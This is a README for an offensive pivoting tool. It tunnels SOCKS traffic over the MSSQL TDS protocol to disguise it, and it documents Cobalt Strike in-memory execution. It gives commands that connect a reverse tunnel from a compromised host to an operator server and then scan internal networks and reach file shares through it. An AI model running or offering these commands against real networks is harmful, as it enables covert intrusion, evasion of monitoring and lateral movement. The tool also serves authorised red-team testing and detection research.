# MSSQL-RevTun

MSSQL-RevTun is a tool for network pivoting. It operates similar to chisel, ligolo and ssh tunneling. The main difference is that it uses the Microsoft SQL Server TDS protocol to make the network traffic look like MSSQL traffic.

It operates in 3 modes:
- **Server**: Listens on a port (1433 by default). Once it receives a client connection, it opens another port (1080 by default). Through the second port, we can use proxychains/tun2socks to forward all traffic though the client.
- **Client**: Connects to server or to the relay using authentic MSSQL authentication. Forwards all traffic from the server.
- **Relay**: Relays the traffic from the client to the server. Use case: the client cannot directly reach the external server but can reach the relay machine.

## Building

### Quick Build
```powershell
.\build-multi.ps1  # Builds .NET Framework 4.8, Linux x64, Windows x64
```

### Manual Builds
```bash
# Windows x64
dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true

# Linux x64  
dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:PublishSingleFile=true

# Cobalt Strike (.NET Framework 4.8)
dotnet build -c Release -f net48 -p:Platform=AnyCPU

# Windows x64 optimized for minimal size (remove the net48 references from revtun.csproj before compiling this way)
dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true -p:EnableCompressionInSingleFile=true -p:PublishTrimmed=true
```

## Usage

### Server
```bash
./revtun server --password testpass
```

### Client 
```bash
./revtun client --host yourproxyserver.com --password testpass
```

### Relay (Traffic Forwarding)
```bash
./revtun relay --host yourproxyserver.com --debug
```

### Using SOCKS Proxy
```bash
proxychains nmap -sT 192.168.1.0/24
proxychains smbclient -U compromised_user //internal.fileserver/Share
```

## Cobalt Strike Integration

### execute-assembly (not opsec in default config)
```bash
# Client from internal network  
execute-assembly revtun.exe client --host [internal.compromised.host/yourproxyserver.com] --password testpass

# Relay on pivot host
execute-assembly revtun.exe relay --host [yourproxyserver.com] 
```

### BOF.NET (in memory execution without creating new processes)
#### Project
- Original: https://github.com/CCob/BOF.NET
- Can run EXEs: https://github.com/williamknows/BOF.NET

#### Requirements
1. Build the BOF.NET DLL (requires .NET Framework 3.5 SP1): 
```
BOF.NET\managed\BOFNET.sln
```
2. Build object files. (instructions in github project)
3. Place all files in one folder:
```txt
bofnet.cna
BOFNET.dll
bofnet_execute.cpp.x86.obj
bofnet_execute.cpp.x64.obj
```
4. Import `bofnet.cna` into Cobalt Strike.

#### Run
```
# initialise BOF.NET
bofnet_init

# Load the .NET assembly
bofnet_load /path/to/revtun.exe

# (Optionally) list the loaded assemblies to check the name
bofnet_listassemblies

# Background execution
bofnet_jobassembly revtun client -h yourproxyserver.com --password testpass
```

#### Reference
https://williamknowles.io/bofnet_executeassembly-native-in-process-execution-of-net-assemblies-in-cobalt-strike/

## Command Options
```
SERVER OPTIONS:
  --password <pass>          Password for authentication (REQUIRED)
  --port, -p <port>          MSSQL server port (default: 1433)
  --proxy-port <port>        Proxy listener port (default: 1080)
  --bind <address>           Bind address (default: 0.0.0.0)
  --verbose, -v              Enable verbose logging
  --require-encryption       Require TLS encryption for all connections
  --no-encryption            Disable TLS encryption support

CLIENT OPTIONS:
  --password <pass>          Password for authentication (REQUIRED)
  --host, -h <hostname>      Server hostname (default: localhost)
  --port, -p <port>          Server port (default: 1433)
  --username, -u <user>      SQL username (default: sa)
  --database, -d <db>        Database name (default: master)
  --auto-exit                Exit after connection test
  --verbose, -v              Enable verbose logging
  --debug                    Enable debug output (shows all messages)
  --encrypt                  Request TLS encryption (default: enabled)
  --no-encrypt               Disable TLS encryption
  --require-encryption       Require TLS encryption (fail if not supported)

RELAY OPTIONS:
  --port, -p <port>          Relay listener port (default: 1433)
  --bind <address>           Bind address (default: 0.0.0.0)
  --host, -h <hostname>      Target server hostname (default: localhost)
  --server-port <port>       Target server port (default: 1433)
  --verbose, -v              Enable verbose logging
  --debug                    Enable debug output (shows TDS packet details)
```
